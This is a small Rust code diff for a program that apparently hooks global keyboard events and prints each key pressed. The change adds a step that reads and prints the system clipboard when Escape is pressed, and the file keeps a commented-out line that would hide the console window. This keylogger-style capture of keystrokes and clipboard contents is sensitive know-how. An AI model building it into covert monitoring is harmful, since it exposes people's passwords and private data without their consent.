@@ -1,5 +1,5 @@
 // #![windows_subsystem = "windows"]
-
+use arboard::Clipboard;
 use core::mem::MaybeUninit;
 use winapi::um::winuser;
 use chrono::{Utc, DateTime};
@@ -153,7 +153,14 @@ fn track(event: Event) {
         EventType::KeyPress(Key::Home) => println!("Home!"),
         EventType::KeyPress(Key::Insert) => println!("Insert!"),
         EventType::KeyPress(Key::End) => println!("End!"),
-        EventType::KeyPress(Key::Escape) => println!("Escape!"),
+        EventType::KeyPress(Key::Escape) => {
+            let mut clipboard = Clipboard::new().unwrap();
+            println!("Clipboard text was: {}", clipboard.get_text().unwrap());
+
+            // let the_string = "Hello, world!";
+            // clipboard.set_text(the_string).unwrap();
+            // println!("But now the clipboard text should be: \"{}\"", the_string);
+        },
         EventType::KeyPress(Key::F1 | Key::F2 | Key::F3 | Key::F4 | Key::F5 | Key::F6 | Key::F7 | Key::F8 | Key::F9 | Key::F10 | Key::F11 | Key::F12) => println!("Fn!"),
         EventType::KeyPress(Key::MetaLeft | Key::MetaRight) => println!("Meta Left/Right!"),
         EventType::KeyPress(Key::ShiftLeft | Key::ShiftRight) => println!("Shift Left/Right!"),
